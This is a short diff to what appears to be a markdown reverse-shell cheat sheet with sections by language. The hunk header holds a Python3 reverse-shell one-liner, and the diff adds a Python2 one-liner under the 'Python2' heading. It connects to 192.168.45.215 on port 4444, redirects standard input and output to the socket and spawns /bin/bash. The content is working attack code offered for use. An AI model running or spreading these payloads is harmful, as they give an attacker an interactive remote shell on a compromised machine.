@@ -43,7 +43,7 @@ python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.45.215",4
 
 ### Python2
 ```bash
-
+python -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.45.215",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
 ```
 
 ### Perl
